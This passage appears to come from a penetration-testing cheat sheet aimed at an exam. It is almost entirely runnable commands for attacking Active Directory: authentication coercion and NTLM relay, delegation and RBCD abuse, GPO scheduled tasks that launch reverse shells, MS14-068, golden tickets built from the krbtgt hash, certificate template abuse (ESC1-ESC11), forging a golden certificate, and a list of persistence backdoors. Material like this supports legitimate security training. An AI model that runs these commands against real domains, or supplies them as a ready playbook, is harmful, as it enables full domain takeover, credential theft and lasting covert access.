# Or check first:
rpcdump.py @<victim_ip> | egrep 'MS-RPRN|MS-PAR'

# 3. DFSCoerce (MS-DFSNM) — uses DFS NetrDfsRemoveStdRoot
python3 dfscoerce.py -u <user> -p '<pass>' -d <domain> <attacker_ip> <victim_ip>

# 4. ShadowCoerce (MS-FSRVP) — uses File Server VSS
python3 shadowcoerce.py -u <user> -p '<pass>' -d <domain> <attacker_ip> <victim_ip>

# 5. Coercer (orchestrator that runs all above + more, picks one that works)
python3 Coercer.py coerce -u <user> -p '<pass>' -d <domain> -l <attacker_ip> -t <victim_ip>
python3 Coercer.py scan -u <user> -p '<pass>' -d <domain> -t <victim_ip>     # check which work

# 6. WebClient service abuse (HTTP-based coercion → needed for ADCS ESC8)
# If WebClient running: PetitPotam to HTTP target works
# Trigger WebClient start remotely:
python3 PetitPotam.py 'http://attacker@80/path' <victim>     # if SearchConnector trick works
```

**Relay targets matrix (where to point ntlmrelayx -t):**
```
Coerced victim    Target relay                          Result
─────────────────────────────────────────────────────────────────────
Workstation       smb://<other_workstation>             RCE (if signing off)
DC                ldaps://<dc>                          add user / RBCD / ACL writes
DC                http://<adcs>/certsrv (--adcs)        cert as DC$ → DCSync (ESC8)
DC                rpc://<adcs> (--adcs --template ...)  cert as DC$ (ESC11)
Any computer      ldaps://<dc> --delegate-access        RBCD on victim → impersonate
```

### 9.8.4 - Shadow Credentials

```bash
# Check if target has msDS-KeyCredentialLink
# If we have write access to this attribute → PKINIT auth as target

# Automated with Certipy
certipy shadow auto -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -account <target_account>

# Output: NT hash for target account
```

### 9.8.5 - GPP Passwords (MS14-025)

```bash
# Find cpassword in SYSVOL
findstr /S /I cpassword \\<dc>\sysvol\<domain>\policies\*.xml

# Decrypt
gpp-decrypt <cpassword_hash>
# Decrypts to plaintext local admin password
```

### 9.8.6 - Delegation Abuse

**Unconstrained Delegation (TrustedForDelegation):**
```bash
# Find unconstrained hosts
# Linux
ldapsearch -h <dc_ip> -x -D '<user>@<domain>' -w '<pass>' -b 'DC=...,DC=...' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName
# Windows
Get-DomainComputer -Unconstrained | select dnshostname

# Compromise unconstrained host → harvest TGTs
# Linux (if you have local admin via PtH)
secretsdump.py -just-dc-user 'krbtgt' <domain>/<user>:'<pass>'@<dc>  # for golden, separate
# Better: deploy rubeus-equivalent harvester. On Linux compromised host:
# Use PoshADCS or krbrelayx with -t flag

# Coerce a DA to authenticate to compromised unconstrained host (e.g. via printerbug)
python3 printerbug.py <domain>/<user>:'<pass>'@<dc_ip> <compromised_unconstrained_host>
# Then on compromised host (Windows): Rubeus.exe monitor /interval:1 /targetuser:<DA>
# Or Linux: krbrelayx.py -aesKey <host_aes> -t <target_spn>
```

**Constrained Delegation (msDS-AllowedToDelegateTo) — Linux full chain:**
```bash
# Find constrained delegation
ldapsearch -h <dc_ip> -x -D '<user>@<domain>' -w '<pass>' -b 'DC=...' '(msDS-AllowedToDelegateTo=*)' sAMAccountName msDS-AllowedToDelegateTo

# We need the compromised service account's password OR NT hash OR AES key
# S4U2self → get TGS for ourselves as target user
# S4U2proxy → swap to TGS for target SPN

getST.py -spn cifs/<target_host> -impersonate administrator -dc-ip <dc_ip> <domain>/<svc_account>:'<pass>'
# or with hash
getST.py -spn cifs/<target_host> -impersonate administrator -dc-ip <dc_ip> -hashes :<nt_hash> <domain>/<svc_account>

# Set ticket env var and use it
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass <target_host>
# Or secretsdump
secretsdump.py -k -no-pass <target_host>

# Protocol Transition trick (TrustedToAuthForDelegation flag): can impersonate ANY user
# Without that flag: works only for users that authenticated via Kerberos to the svc
```

**Resource-Based Constrained Delegation (RBCD) — full Linux chain:**
```bash
# Requires: Write access to target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
# Common source: GenericWrite/GenericAll over computer object via BloodHound

# Step 1: Create a fake computer account (any domain user can — ms-DS-MachineAccountQuota default 10)
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Pass123!' -dc-ip <dc_ip> '<domain>/<user>:<pass>'

# Step 2: Write RBCD: target trusts FAKE01$
rbcd.py -delegate-from 'FAKE01$' -delegate-to '<TARGET>$' -action write -dc-ip <dc_ip> '<domain>/<user>:<pass>'

# Step 3: S4U as FAKE01$ to get TGS as admin for target
getST.py -spn cifs/<target>.<domain> -impersonate administrator -dc-ip <dc_ip> '<domain>/FAKE01$:Pass123!'

# Step 4: Use ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass <target>.<domain>
secretsdump.py -k -no-pass <target>.<domain>

# Cleanup: remove RBCD attribute
rbcd.py -delegate-from 'FAKE01$' -delegate-to '<TARGET>$' -action remove -dc-ip <dc_ip> '<domain>/<user>:<pass>'
```

**Windows equivalents (Rubeus):**
```powershell
# Unconstrained TGT harvest
Rubeus.exe monitor /interval:1 /nowrap

# Constrained S4U
Rubeus.exe s4u /user:<svc_account> /rc4:<nt_hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt

# RBCD (after fake computer + DACL write done from Linux or PowerView)
Rubeus.exe s4u /user:FAKE01$ /rc4:<fake_hash> /impersonateuser:administrator /msdsspn:cifs/<target> /ptt
```

### 9.8.7 - GPO Abuse (writable Group Policy Object)

> If we have GenericWrite / WriteDacl / WriteProperty over a GPO, we control everything in OUs it applies to.
> BloodHound edge: `GenericWrite` / `WriteOwner` / `WriteDacl` → GPO.

**Enumerate:**
```powershell
# PowerView — list GPO names
Get-DomainGPO | select displayname

# Find GPOs where Domain Users / our SID has rights
$sid = Convert-NameToSid "<our_user>"
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}

# GPO → which OU does it apply to? (Affected Objects)
# BloodHound: select GPO node → Node Info → Affected Objects
# Or PowerShell:
Get-GPO -Guid <guid> | Get-GPOReport -ReportType Xml
```

**Exploit with SharpGPOAbuse:**
```powershell
# Add user to local Administrators on every host the GPO applies to
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <our_user> --GPOName "<gpo_name>"

# Immediate scheduled task (runs as SYSTEM next gpupdate / boot)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author NT_AUTHORITY\SYSTEM \
  --Command "cmd.exe" --Arguments "/c powershell -enc <BASE64_REV_SHELL>" --GPOName "<gpo_name>"

# Immediate user-context task
.\SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Author DOMAIN\Admin \
  --Command "cmd.exe" --Arguments "/c <reverse_shell>" --GPOName "<gpo_name>"

# Force update on a target host (or wait for default 90-min refresh + 30-min random)
gpupdate /force

# Add right to a user (e.g. SeDebugPrivilege)
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege" \
  --UserAccount <our_user> --GPOName "<gpo_name>"
```

**Warning:** GPO applies to ALL hosts in linked OU. If OU has 1000 hosts, you just made 1000 local admins. Use `--Computer` filter when available, target a single low-impact host, and clean up post-exam.

**Cleanup:** Re-run SharpGPOAbuse with the inverse, or restore from saved GPO XML.

### 9.8.8 - MS14-068 (Kerberos PAC Forgery)

> Old but exam-relevant if patch level shows pre-Nov 2014. Any domain user → DA via forged PAC.

```bash
# Linux: Impacket goldenPac
goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<pass>'@<dc_fqdn>

# Linux: PyKEK (older)
python3 ms14-068.py -u <user>@<domain> -s <user_sid> -d <dc_ip> -p '<pass>'
# Output: TGT.ccache
export KRB5CCNAME=TGT.ccache
psexec.py -k -no-pass <dc_fqdn>

# Windows: Kekeo
kekeo # ms14068::ptc /domain:<domain> /user:<user> /password:<pass> /sid:<user_sid>

# Pre-req check: target DC must be missing patch KB3011780
```

### 9.8.9 - PrivExchange (Exchange → DA)

> Exchange Server with WriteDacl on domain pre-CU 2019. Force Exchange to auth back, relay to LDAP, grant DCSync.
> Affected: Exchange 2010-2019 pre-Feb 2019 CU.

```bash
# Terminal 1: ntlmrelayx → LDAP (no signing on LDAP by default)
ntlmrelayx.py -t ldap://<dc_ip> --escalate-user <our_user>

# Terminal 2: PrivExchange (force Exchange to auth)
python3 privexchange.py -ah <attacker_ip> <exchange_fqdn> -u <user> -d <domain> -p '<pass>'

# Result: <our_user> granted DCSync rights → secretsdump.py
secretsdump.py -just-dc <domain>/<our_user>:'<pass>'@<dc_ip>
```

### 9.8.10 - Printer Bug Pre-Check (companion to coerced auth in §9.8.3b)
```powershell
# Check if MS-RPRN exposed on target (uses SecurityAssessment.ps1)
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName <target_fqdn>
# True = vulnerable → printerbug.py from §9.8.3b will work
```

### 9.8.11 - adidnsdump (Enumerate AD-integrated DNS records)

> Default users can list child objects of DNS zone. Pull hidden A records / hosts with descriptive names.

```bash
# Dump AD DNS zone
adidnsdump -u <domain>\\<user> ldap://<dc_ip>
# Resolve hidden records
adidnsdump -u <domain>\\<user> ldap://<dc_ip> -r
# Records saved to records.csv
cat records.csv | grep -i 'JENKINS\|SQL\|BACKUP\|JIRA\|GITLAB\|VPN'
```

---

## 9.9 - DOMAIN TRUST ATTACKS

### 9.9.1 - Trust Enumeration

```bash
# CrackMapExec
netexec smb <dc_ip> -u <user> -p '<pass>' --trusts

# Impacket
lookupsid.py <domain>/<user>:<pass>@<dc_ip>

# PowerShell
Get-ADTrust -Filter *
Get-DomainTrustMapping

# BloodHound: "Find All Domain Trusts" query
```

### 9.9.2 - Child → Parent (ExtraSids Attack)

```
Required:
├── KRBTGT NT hash (child domain)
├── Child domain SID
├── Fake username
└── Enterprise Admins SID (parent): <PARENT_SID>-519
```

```bash
# Get child SID
lookupsid.py <child_domain>/<user>:<pass>@<child_dc> | grep "Domain SID"

# Linux: ticketer.py
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <parent_sid>-519 -domain <child_domain> hacker
export KRB5CCNAME=hacker.ccache
secretsdump.py -k -no-pass -dc-ip <parent_dc> hacker@<parent_dc_fqdn>

# Windows: Mimikatz
mimikatz # kerberos::golden /user:hacker /domain:<child_domain> /sid:<child_sid> /krbtgt:<hash> /sids:<parent_sid>-519 /ptt

# Windows: Rubeus
Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_sid>-519 /user:hacker /ptt

# Automated
raiseChild.py -target-exec <parent_dc_ip> <child_domain>/admin
```

### 9.9.3 - Cross-Forest Trust Abuse

```bash
# Cross-Forest Kerberoasting
GetUserSPNs.py -target-domain <foreign_domain> <our_domain>/<user> -request
# Windows: Rubeus.exe kerberoast /domain:<foreign_domain> /user:<target> /nowrap

# Foreign group membership
Get-DomainForeignGroupMember -Domain <foreign_domain>

# Admin password reuse across forests
# Try same creds in trusting domain
netexec smb <foreign_dc> -u <user> -p '<pass>'
```

---

## 9.10 - ADCS ABUSE (ESC1-ESC11)

> Active Directory Certificate Services. High-value path on CPTS exam.
> Auth as user → request cert with target's SAN → PKINIT → TGT as target (often DA).

### 9.10.1 - ADCS Discovery + Vuln Scan

```bash
# Find CAs and templates
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -stdout
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable -stdout
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -enabled -stdout

# Save full enum (JSON + text)
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip>

# Windows alt: Certify
.\Certify.exe find /vulnerable
.\Certify.exe cas              # List CAs
```

### 9.10.2 - ESC1 (EnrolleeSuppliesSubject + ClientAuth EKU)

```
Conditions:
├── Low-priv user has Enroll right
├── Template allows EnrolleeSuppliesSubject=True
├── EKU contains Client Authentication / Smart Card Logon / Any Purpose
└── ManagerApproval=False
```

```bash
# Request cert as Administrator
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template <vuln_template> -upn administrator@<domain>

# Authenticate (PKINIT) → NT hash + TGT
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>

# Output: NT hash of administrator → Pass-the-Hash anywhere
```

### 9.10.3 - ESC2 (Any Purpose EKU)

```
Conditions: Template has Any Purpose (OID 2.5.29.37.0) or no EKU + ClientAuth enroll
Same exploit as ESC1 (cert can be used for client auth)
```

```bash
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template <any_purpose_template> -upn administrator@<domain>
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 9.10.4 - ESC3 (Enrollment Agent template)

```
Conditions:
├── Template has Certificate Request Agent EKU
├── Low-priv user can enroll
└── Second template allows enrollment-on-behalf-of
```

```bash
# Get enrollment agent cert
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template <agent_template>

# Use it to request cert as administrator
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template User -on-behalf-of '<domain>\administrator' -pfx <agent>.pfx

certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 9.10.5 - ESC4 (Writable Template ACL)

```
Conditions: We have WriteDACL / WriteOwner / GenericAll over a template
Exploit: Edit template → make it ESC1-vulnerable → request cert
```

```bash
# Make template ESC1-vulnerable
certipy template -u <user>@<domain> -p '<pass>' -template <target_template> -save-old

# Restore after (clean-up)
certipy template -u <user>@<domain> -p '<pass>' -template <target_template> -configuration <saved_config>

# Then exploit as ESC1
```

### 9.10.6 - ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

```
Conditions: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set (CA-level, not template)
Exploit: Any template with ClientAuth EKU works — specify SAN in request
```

```bash
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template User -upn administrator@<domain>
# CA blindly accepts the SAN
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 9.10.7 - ESC7 (CA Admin / Officer Rights)

```
Conditions: We have ManageCA or ManageCertificates over CA
Exploit: Grant self enrollment on ESC1-style template, OR approve own pending request
```

```bash
# Self-grant Officer rights, approve own request
certipy ca -u <user>@<domain> -p '<pass>' -ca <ca_name> -add-officer <user>
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -template SubCA -upn administrator@<domain>   # Will be denied — request ID needed
certipy ca -u <user>@<domain> -p '<pass>' -ca <ca_name> -issue-request <request_id>
certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -retrieve <request_id>
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

### 9.10.8 - ESC8 (HTTP Enrollment + NTLM Relay)

```
Conditions: CA exposes /certsrv HTTP enrollment endpoint, no EPA, no HTTPS-only
Exploit: Coerce DC auth → relay to /certsrv → cert as DC$ → DCSync
```

```bash
# Check HTTP enrollment exposed
curl -I http://<adcs_host>/certsrv/
# Returns 401 NTLM = vulnerable

# Start relay (template DomainController for DC machine account)
certipy relay -target http://<adcs_host> -template DomainController
# Or with impacket
ntlmrelayx.py -t http://<adcs_host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC auth (see §9.8.7 for all coercion methods)
python3 PetitPotam.py <attacker_ip> <dc_ip>

# Relayed → PFX file saved → authenticate as DC$
certipy auth -pfx <dc_machine_account>.pfx -dc-ip <dc_ip>

# DC$ hash → DCSync
secretsdump.py -just-dc -hashes :<dc_nt_hash> '<domain>/<dc_account>$@<dc_ip>'
```

### 9.10.9 - ESC9 / ESC10 / ESC11 (newer, less common)

```
ESC9: no security extension on template + write GenericWrite on victim → set victim UPN to admin → request cert
ESC10: weak certificate mapping (Schannel) — similar UPN swap path
ESC11: NTLM relay to ICPR RPC endpoint (no /certsrv needed)

certipy req -u <user>@<domain> -p '<pass>' -ca <ca_name> -target <ca_host> -template ESC9 -upn administrator
# For ESC11:
certipy relay -target rpc://<adcs_host> -template DomainController
```

### 9.10.10 - Persistence via Certificate

```bash
# Once you have a cert, save it — valid for years even after password rotation
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>   # gets fresh TGT/hash on demand

# Forge "Golden Certificate" (CA compromised — extract CA key)
certipy ca -backup -u <user>@<domain> -p '<pass>' -ca <ca_name>
# Output: CA .pfx → forge certs for any user, persistent backdoor
certipy forge -ca-pfx <ca>.pfx -upn administrator@<domain>
```

---

## 9.11 - POST-DOMAIN COMPROMISE

```
├─ Dump NTDS.dit: secretsdump.py <domain>/<da>:<pass>@<dc_ip>
├─ Golden Ticket: kerberos::golden /krbtgt:HASH /domain:DOMAIN /sid:SID
├─ Silver Ticket: kerberos::golden /user:Admin /domain:DOMAIN /sid:SID /target:SPN /rc4:HASH
├─ Skeleton Key: misc::skeleton (inject into DC memory)
├─ AdminSDHolder: Modify ACL → propagate to all protected groups
├─ DSRM backdoor: Enable DSRM network logon
├─ Certificate persistence: Install ADCS, issue persistent certs
└─ Domain trust → compromise parent/trusting domain
```

---

> AD iterative rules consolidated at end of doc — see "ITERATIVE METHODOLOGY RULES".

---